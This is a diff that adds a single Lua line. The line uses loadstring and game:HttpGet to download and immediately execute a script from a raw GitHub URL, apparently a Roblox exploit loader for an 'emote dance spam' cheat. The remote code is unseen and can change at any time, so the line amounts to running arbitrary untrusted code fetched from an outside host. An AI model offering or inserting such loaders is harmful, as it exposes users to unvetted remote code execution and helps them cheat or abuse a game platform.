@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/trending-emote-dance-spam7-iugmhhifo6blx5.lua"))()
